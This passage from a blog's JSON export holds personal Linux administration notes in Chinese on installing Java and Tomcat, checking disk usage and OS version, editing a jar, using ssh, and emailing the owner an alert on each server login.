class=\"line\">vi /etc/profile </span><br><span class=\"line\"></span><br><span class=\"line\">#set java environment</span><br><span class=\"line\">JAVA_HOME=/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64</span><br><span class=\"line\">JRE_HOME=$JAVA_HOME/jre</span><br><span class=\"line\">CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class=\"line\">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class=\"line\">export JAVA_HOME JRE_HOME CLASS_PATH PATH </span><br><span class=\"line\"></span><br><span class=\"line\">source /etc/profile </span><br><span class=\"line\"></span><br><span class=\"line\">java -versiob</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum search java|grep jdk</span><br><span class=\"line\"></span><br><span class=\"line\">ava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environment </span><br><span class=\"line\">java-1.6.0-openjdk-demo.x86_64 : OpenJDK Demos </span><br><span class=\"line\">java-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environment </span><br><span class=\"line\">java-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentation </span><br><span class=\"line\">java-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundle </span><br><span class=\"line\">java-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environment </span><br><span class=\"line\">java-1.7.0-openjdk-demo.x86_64 : OpenJDK Demos </span><br><span class=\"line\">java-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environment </span><br><span class=\"line\">java-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentation </span><br><span class=\"line\">java-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundle </span><br><span class=\"line\">java-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environme</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">yum install java-1.7.0-openjdk</span><br><span class=\"line\">Loaded plugins: fastestmirror</span><br><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\"> * base: mirror.metrocast.net</span><br><span class=\"line\"> * epel: epel.mirror.constant.com</span><br><span class=\"line\"> * extras: mirror.metrocast.net</span><br><span class=\"line\"> * updates: mirror.metrocast.net</span><br><span class=\"line\">Resolving Dependencies</span><br><span class=\"line\">--&gt; Running transaction check</span><br><span class=\"line\">---&gt; Package java-1.7.0-openjdk.x86_64 1:1.7.0.141-2.6.10.1.el7_3 will be installed</span><br><span class=\"line\">--&gt; Processing Dependency: java-1.7.0-openjdk-headless = 1:1.7.0.141-2.6.10.1.el7_3 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br><span class=\"line\">--&gt; Processing Dependency: xorg-x11-fonts-Type1 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br><span class=\"line\">--&gt; Processing Dependency: libpulse.so.0(PULSE_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br><span class=\"line\">--&gt; Processing Dependency: libpng15.so.15(PNG15_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br></pre></td></tr></table></figure>\n<p>安装完之后，默认的安装目录是在: /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/profile </span><br><span class=\"line\"></span><br><span class=\"line\">#set java environment</span><br><span class=\"line\">JAVA_HOME=/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64</span><br><span class=\"line\">JRE_HOME=$JAVA_HOME/jre</span><br><span class=\"line\">CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class=\"line\">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class=\"line\">export JAVA_HOME JRE_HOME CLASS_PATH PATH </span><br><span class=\"line\"></span><br><span class=\"line\">source /etc/profile </span><br><span class=\"line\"></span><br><span class=\"line\">java -versiob</span><br></pre></td></tr></table></figure></p>\n"},{"title":"存储","date":"2018-07-10T13:09:19.000Z","_content":"- ### 存储使用情况\n```\ndf -h \n\nroot@hs03 yfzx]# df -h\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_dev023053-lv_root\n                      295G  212G   69G  76% /\ntmpfs                  16G     0   16G   0% /dev/shm\n/dev/sda1             477M   33M  419M   8% /boot\ncm_processes           16G   36M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process\n\ndf -helo\n```\n其他使用方法\n```\nMandatory arguments to long options are mandatory for short options too.\n  -a, --all             include dummy file systems\n  -B, --block-size=SIZE  use SIZE-byte blocks\n      --direct          show statistics for a file instead of mount point\n      --total           produce a grand total\n  -h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)\n  -H, --si              likewise, but use powers of 1000 not 1024\n  -i, --inodes          list inode information instead of block usage\n  -k                    like --block-size=1K\n  -l, --local           limit listing to local file systems\n      --no-sync         do not invoke sync before getting usage info (default)\n  -P, --portability     use the POSIX output format\n      --sync            invoke sync before getting usage info\n  -t, --type=TYPE       limit listing to file systems of type TYPE\n  -T, --print-type      print file system type\n  -x, --exclude-type=TYPE   limit listing to file systems not of type TYPE\n  -v                    (ignored)\n      --help     display this help and exit\n      --version  output version information and exit\n```","source":"_posts/Linux/存储.md","raw":"---\ntitle: 存储\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n- ### 存储使用情况\n```\ndf -h \n\nroot@hs03 yfzx]# df -h\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_dev023053-lv_root\n                      295G  212G   69G  76% /\ntmpfs                  16G     0   16G   0% /dev/shm\n/dev/sda1             477M   33M  419M   8% /boot\ncm_processes           16G   36M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process\n\ndf -helo\n```\n其他使用方法\n```\nMandatory arguments to long options are mandatory for short options too.\n  -a, --all             include dummy file systems\n  -B, --block-size=SIZE  use SIZE-byte blocks\n      --direct          show statistics for a file instead of mount point\n      --total           produce a grand total\n  -h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)\n  -H, --si              likewise, but use powers of 1000 not 1024\n  -i, --inodes          list inode information instead of block usage\n  -k                    like --block-size=1K\n  -l, --local           limit listing to local file systems\n      --no-sync         do not invoke sync before getting usage info (default)\n  -P, --portability     use the POSIX output format\n      --sync            invoke sync before getting usage info\n  -t, --type=TYPE       limit listing to file systems of type TYPE\n  -T, --print-type      print file system type\n  -x, --exclude-type=TYPE   limit listing to file systems not of type TYPE\n  -v                    (ignored)\n      --help     display this help and exit\n      --version  output version information and exit\n```","slug":"Linux/存储","published":1,"updated":"2018-07-10T13:10:09.938Z","_id":"cjjedmhap00520gtjqvml0jpz","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"存储使用情况\"><a href=\"#存储使用情况\" class=\"headerlink\" title=\"存储使用情况\"></a>存储使用情况</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df -h </span><br><span class=\"line\"></span><br><span class=\"line\">root@hs03 yfzx]# df -h</span><br><span class=\"line\">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class=\"line\">/dev/mapper/vg_dev023053-lv_root</span><br><span class=\"line\">                      295G  212G   69G  76% /</span><br><span class=\"line\">tmpfs                  16G     0   16G   0% /dev/shm</span><br><span class=\"line\">/dev/sda1             477M   33M  419M   8% /boot</span><br><span class=\"line\">cm_processes           16G   36M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process</span><br><span class=\"line\"></span><br><span class=\"line\">df -helo</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>其他使用方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Mandatory arguments to long options are mandatory for short options too.</span><br><span class=\"line\">  -a, --all             include dummy file systems</span><br><span class=\"line\">  -B, --block-size=SIZE  use SIZE-byte blocks</span><br><span class=\"line\">      --direct          show statistics for a file instead of mount point</span><br><span class=\"line\">      --total           produce a grand total</span><br><span class=\"line\">  -h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)</span><br><span class=\"line\">  -H, --si              likewise, but use powers of 1000 not 1024</span><br><span class=\"line\">  -i, --inodes          list inode information instead of block usage</span><br><span class=\"line\">  -k                    like --block-size=1K</span><br><span class=\"line\">  -l, --local           limit listing to local file systems</span><br><span class=\"line\">      --no-sync         do not invoke sync before getting usage info (default)</span><br><span class=\"line\">  -P, --portability     use the POSIX output format</span><br><span class=\"line\">      --sync            invoke sync before getting usage info</span><br><span class=\"line\">  -t, --type=TYPE       limit listing to file systems of type TYPE</span><br><span class=\"line\">  -T, --print-type      print file system type</span><br><span class=\"line\">  -x, --exclude-type=TYPE   limit listing to file systems not of type TYPE</span><br><span class=\"line\">  -v                    (ignored)</span><br><span class=\"line\">      --help     display this help and exit</span><br><span class=\"line\">      --version  output version information and exit</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"存储使用情况\"><a href=\"#存储使用情况\" class=\"headerlink\" title=\"存储使用情况\"></a>存储使用情况</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df -h </span><br><span class=\"line\"></span><br><span class=\"line\">root@hs03 yfzx]# df -h</span><br><span class=\"line\">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class=\"line\">/dev/mapper/vg_dev023053-lv_root</span><br><span class=\"line\">                      295G  212G   69G  76% /</span><br><span class=\"line\">tmpfs                  16G     0   16G   0% /dev/shm</span><br><span class=\"line\">/dev/sda1             477M   33M  419M   8% /boot</span><br><span class=\"line\">cm_processes           16G   36M   16G   1% /opt/cm-5.7.1/run/cloudera-scm-agent/process</span><br><span class=\"line\"></span><br><span class=\"line\">df -helo</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>其他使用方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Mandatory arguments to long options are mandatory for short options too.</span><br><span class=\"line\">  -a, --all             include dummy file systems</span><br><span class=\"line\">  -B, --block-size=SIZE  use SIZE-byte blocks</span><br><span class=\"line\">      --direct          show statistics for a file instead of mount point</span><br><span class=\"line\">      --total           produce a grand total</span><br><span class=\"line\">  -h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)</span><br><span class=\"line\">  -H, --si              likewise, but use powers of 1000 not 1024</span><br><span class=\"line\">  -i, --inodes          list inode information instead of block usage</span><br><span class=\"line\">  -k                    like --block-size=1K</span><br><span class=\"line\">  -l, --local           limit listing to local file systems</span><br><span class=\"line\">      --no-sync         do not invoke sync before getting usage info (default)</span><br><span class=\"line\">  -P, --portability     use the POSIX output format</span><br><span class=\"line\">      --sync            invoke sync before getting usage info</span><br><span class=\"line\">  -t, --type=TYPE       limit listing to file systems of type TYPE</span><br><span class=\"line\">  -T, --print-type      print file system type</span><br><span class=\"line\">  -x, --exclude-type=TYPE   limit listing to file systems not of type TYPE</span><br><span class=\"line\">  -v                    (ignored)</span><br><span class=\"line\">      --help     display this help and exit</span><br><span class=\"line\">      --version  output version information and exit</span><br></pre></td></tr></table></figure></p>\n"},{"title":"安装tomcat","date":"2018-07-10T13:09:19.000Z","_content":"```cd/usr\nmkdir software\ncd software\nwget http://apache.fayea.com/tomcat/tomcat-8/v8.5.15/bin/apache-tomcat-8.5.15.tar.gz\ntar -zxvf apache-tomcat-8.5.9.tar.gz\n```","source":"_posts/Linux/安装tomcat.md","raw":"---\ntitle: 安装tomcat\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```cd/usr\nmkdir software\ncd software\nwget http://apache.fayea.com/tomcat/tomcat-8/v8.5.15/bin/apache-tomcat-8.5.15.tar.gz\ntar -zxvf apache-tomcat-8.5.9.tar.gz\n```","slug":"Linux/安装tomcat","published":1,"updated":"2018-07-10T13:10:09.941Z","_id":"cjjedmhaq00540gtja9up8fi3","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir software</span><br><span class=\"line\">cd software</span><br><span class=\"line\">wget http://apache.fayea.com/tomcat/tomcat-8/v8.5.15/bin/apache-tomcat-8.5.15.tar.gz</span><br><span class=\"line\">tar -zxvf apache-tomcat-8.5.9.tar.gz</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir software</span><br><span class=\"line\">cd software</span><br><span class=\"line\">wget http://apache.fayea.com/tomcat/tomcat-8/v8.5.15/bin/apache-tomcat-8.5.15.tar.gz</span><br><span class=\"line\">tar -zxvf apache-tomcat-8.5.9.tar.gz</span><br></pre></td></tr></table></figure>"},{"title":"替换jar包中为文件","date":"2018-07-10T13:09:19.000Z","_content":"```\njar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce\n\njar xvf tag-1.5.3-release-jar-with-dependencies.jar com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class\n\nrm com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class\n\ncp ProdMatchReduce.class com/hs/tag/tag/accept/prodaccept/\n\njar uvf tag-1.5.3-release-jar-with-dependencies.jarcom/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class\n```\n组合\n```\njar xvf tag-1.5.3-release-jar-with-dependencies.jar `jar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce | awk '{print $NF}'`","source":"_posts/Linux/替换jar包中为文件.md","raw":"---\ntitle: 替换jar包中为文件\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\njar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce\n\njar xvf tag-1.5.3-release-jar-with-dependencies.jar com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class\n\nrm com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class\n\ncp ProdMatchReduce.class com/hs/tag/tag/accept/prodaccept/\n\njar uvf tag-1.5.3-release-jar-with-dependencies.jarcom/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class\n```\n组合\n```\njar xvf tag-1.5.3-release-jar-with-dependencies.jar `jar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce | awk '{print $NF}'`","slug":"Linux/替换jar包中为文件","published":1,"updated":"2018-07-10T13:10:09.943Z","_id":"cjjedmhar00560gtjz61pa9ql","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce</span><br><span class=\"line\"></span><br><span class=\"line\">jar xvf tag-1.5.3-release-jar-with-dependencies.jar com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class</span><br><span class=\"line\"></span><br><span class=\"line\">rm com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class</span><br><span class=\"line\"></span><br><span class=\"line\">cp ProdMatchReduce.class com/hs/tag/tag/accept/prodaccept/</span><br><span class=\"line\"></span><br><span class=\"line\">jar uvf tag-1.5.3-release-jar-with-dependencies.jarcom/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class</span><br></pre></td></tr></table></figure>\n<p>组合<br><code>`</code><br>jar xvf tag-1.5.3-release-jar-with-dependencies.jar <code>jar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce | awk &#39;{print $NF}&#39;</code></p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce</span><br><span class=\"line\"></span><br><span class=\"line\">jar xvf tag-1.5.3-release-jar-with-dependencies.jar com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class</span><br><span class=\"line\"></span><br><span class=\"line\">rm com/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class</span><br><span class=\"line\"></span><br><span class=\"line\">cp ProdMatchReduce.class com/hs/tag/tag/accept/prodaccept/</span><br><span class=\"line\"></span><br><span class=\"line\">jar uvf tag-1.5.3-release-jar-with-dependencies.jarcom/hs/tag/tag/accept/prodaccept/ProdacceptReduce.class</span><br></pre></td></tr></table></figure>\n<p>组合<br><code>`</code><br>jar xvf tag-1.5.3-release-jar-with-dependencies.jar <code>jar tvf tag-1.5.3-release-jar-with-dependencies.jar | grep ProdacceptReduce | awk &#39;{print $NF}&#39;</code></p>\n"},{"title":"查看版本","date":"2018-07-10T13:09:19.000Z","_content":"输入\"uname -a \",可显示电脑以及操作系统的相关信息\n\n输入\"cat /proc/version\",说明正在运行的内核版本。\n\n输入\"cat /etc/issue\", 显示的是发行版本信息\n\nsb_release -a (适用于所有的linux，包括Redhat、SuSE、Debian等发行版，但是在debian下要安装lsb)","source":"_posts/Linux/查看版本.md","raw":"---\ntitle: 查看版本\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n输入\"uname -a \",可显示电脑以及操作系统的相关信息\n\n输入\"cat /proc/version\",说明正在运行的内核版本。\n\n输入\"cat /etc/issue\", 显示的是发行版本信息\n\nsb_release -a (适用于所有的linux，包括Redhat、SuSE、Debian等发行版，但是在debian下要安装lsb)","slug":"Linux/查看版本","published":1,"updated":"2018-07-10T13:10:09.945Z","_id":"cjjedmhas00580gtjqrnbmn98","comments":1,"layout":"post","photos":[],"link":"","content":"<p>输入”uname -a “,可显示电脑以及操作系统的相关信息</p>\n<p>输入”cat /proc/version”,说明正在运行的内核版本。</p>\n<p>输入”cat /etc/issue”, 显示的是发行版本信息</p>\n<p>sb_release -a (适用于所有的linux，包括Redhat、SuSE、Debian等发行版，但是在debian下要安装lsb)</p>\n","site":{"data":{}},"excerpt":"","more":"<p>输入”uname -a “,可显示电脑以及操作系统的相关信息</p>\n<p>输入”cat /proc/version”,说明正在运行的内核版本。</p>\n<p>输入”cat /etc/issue”, 显示的是发行版本信息</p>\n<p>sb_release -a (适用于所有的linux，包括Redhat、SuSE、Debian等发行版，但是在debian下要安装lsb)</p>\n"},{"title":"登录到其他服务器","date":"2018-07-10T13:09:19.000Z","_content":"\n    ssh -l root ip","source":"_posts/Linux/登录到其他服务器.md","raw":"---\ntitle: 登录到其他服务器\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n\n    ssh -l root ip","slug":"Linux/登录到其他服务器","published":1,"updated":"2018-07-10T13:10:09.947Z","_id":"cjjedmhat005a0gtjd6xdvi6r","comments":1,"layout":"post","photos":[],"link":"","content":"<pre><code>ssh -l root ip\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<pre><code>ssh -l root ip\n</code></pre>"},{"title":"监控登录","date":"2018-07-10T13:09:19.000Z","_content":"\nlast命令\n```\nlast\nroot     pts/3        192.168.207.1    Tue Oct 24 14:05   still logged in   \nroot     pts/2        192.168.207.1    Tue Oct 24 12:50   still logged in   \nroot     pts/1        192.168.207.1    Tue Oct 24 12:50   still logged in \n```\nlast -h\n    \n    last: invalid option -- 'h'\n    Usage: last [-num | -n num] [-f file] [-t YYYYMMDDHHMMSS] [-R] [-adioxFw] [username..] [tty..]\ncat /etc/profile\n```\n# System wide environment and startup programs, for login setup\n# Functions and aliases go in /etc/bashrc\n\n# It's NOT a good idea to change this file unless you know what you\n# are doing. It's much better to create a custom.sh shell script in\n# /etc/profile.d/ to make custom changes to your environment, as this\n# will prevent the need for merging in future updates.\n```\ncat /etc/bashrc\n```\n# System wide functions and aliases\n# Environment stuff goes in /etc/profile\n\n# It's NOT a good idea to change this file unless you know what you\n# are doing. It's much better to create a custom.sh shell script in\n# /etc/profile.d/ to make custom changes to your environment, as this\n# will prevent the need for merging in future updates.\n```\nvim  /etc/bashrc\n```\n......\n.......\n    SHELL=/bin/bash\n    # Only display echos from profile.d scripts if we are no login shell\n    # and interactive - otherwise just process them to set envvars\n    for i in /etc/profile.d/*.sh; do\n        if [ -r \"$i\" ]; then\n            if [ \"$PS1\" ]; then\n                . \"$i\"\n            else\n                . \"$i\" >/dev/null\n            fi\n        fi\n    done\n\n    unset i\n    unset -f pathmunge\nfi\n\n\n#添加\necho \"some bitch has logged in your server\" | mail -s \"有人登录，快看\"  123456@qq.com\n```\n","source":"_posts/Linux/监控登录.md","raw":"---\ntitle: 监控登录\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n\nlast命令\n```\nlast\nroot     pts/3        192.168.207.1    Tue Oct 24 14:05   still logged in   \nroot     pts/2        192.168.207.1    Tue Oct 24 12:50   still logged in   \nroot     pts/1        192.168.207.1    Tue Oct 24 12:50   still logged in \n```\nlast -h\n    \n    last: invalid option -- 'h'\n    Usage: last [-num | -n num] [-f file] [-t YYYYMMDDHHMMSS] [-R] [-adioxFw] [username..] [tty..]\ncat /etc/profile\n```\n# System wide environment and startup programs, for login setup\n# Functions and aliases go in /etc/bashrc\n\n# It's NOT a good idea to change this file unless you know what you\n# are doing. It's much better to create a custom.sh shell script in\n# /etc/profile.d/ to make custom changes to your environment, as this\n# will prevent the need for merging in future updates.\n```\ncat /etc/bashrc\n```\n# System wide functions and aliases\n# Environment stuff goes in /etc/profile\n\n# It's NOT a good idea to change this file unless you know what you\n# are doing. It's much better to create a custom.sh shell script in\n# /etc/profile.d/ to make custom changes to your environment, as this\n# will prevent the need for merging in future updates.\n```\nvim  /etc/bashrc\n```\n......\n.......\n    SHELL=/bin/bash\n    # Only display echos from profile.d scripts if we are no login shell\n    # and interactive - otherwise just process them to set envvars\n    for i in /etc/profile.d/*.sh; do\n        if [ -r \"$i\" ]; then\n            if [ \"$PS1\" ]; then\n                . \"$i\"\n            else\n                . \"$i\" >/dev/null\n            fi\n        fi\n    done\n\n    unset i\n    unset -f pathmunge\nfi\n\n\n#添加\necho \"some bitch has logged in your server\" | mail -s \"有人登录，快看\"  123456@qq.com\n```\n","slug":"Linux/监控登录","published":1,"updated":"2018-07-10T13:10:09.948Z","_id":"cjjedmhau005c0gtj2o80y5g5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>last命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">last</span><br><span class=\"line\">root     pts/3        192.168.207.1    Tue Oct 24 14:05   still logged in   </span><br><span class=\"line\">root     pts/2        192.168.207.1    Tue Oct 24 12:50   still logged in   </span><br><span class=\"line\">root     pts/1        192.168.207.1    Tue Oct 24 12:50   still logged in</span><br></pre></td></tr></table></figure></p>\n<p>last -h</p>\n<pre><code>last: invalid option -- &apos;h&apos;\nUsage: last [-num | -n num] [-f file] [-t YYYYMMDDHHMMSS] [-R] [-adioxFw] [username..] [tty..]\n</code></pre><p>cat /etc/profile<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># System wide environment and startup programs, for login setup</span><br><span class=\"line\"># Functions and aliases go in /etc/bashrc</span><br><span class=\"line\"></span><br><span class=\"line\"># It&apos;s NOT a good idea to change this file unless you know what you</span><br><span class=\"line\"># are doing. It&apos;s much better to create a custom.sh shell script in</span><br><span class=\"line\"># /etc/profile.d/ to make custom changes to your environment, as this</span><br><span class=\"line\"># will prevent the need for merging in future updates.</span><br></pre></td></tr></table></figure></p>\n<p>cat /etc/bashrc<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># System wide functions and aliases</span><br><span class=\"line\"># Environment stuff goes in /etc/profile</span><br><span class=\"line\"></span><br><span class=\"line\"># It&apos;s NOT a good idea to change this file unless you know what you</span><br><span class=\"line\"># are doing. It&apos;s much better to create a custom.sh shell script in</span><br><span class=\"line\"># /etc/profile.d/ to make custom changes to your environment, as this</span><br><span class=\"line\"># will prevent the need for merging in future updates.</span><br></pre></td></tr></table></figure></p>\n<p>vim  /etc/bashrc<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\">.......</span><br><span class=\"line\">    SHELL=/bin/bash</span><br><span class=\"line\">    # Only display echos from profile.d scripts if we are no login shell</span><br><span class=\"line\">    # and interactive - otherwise just process them to set envvars</span><br><span class=\"line\">    for i in /etc/profile.d/*.sh; do</span><br><span class=\"line\">        if [ -r &quot;$i&quot; ]; then</span><br><span class=\"line\">            if [ &quot;$PS1&quot; ]; then</span><br><span 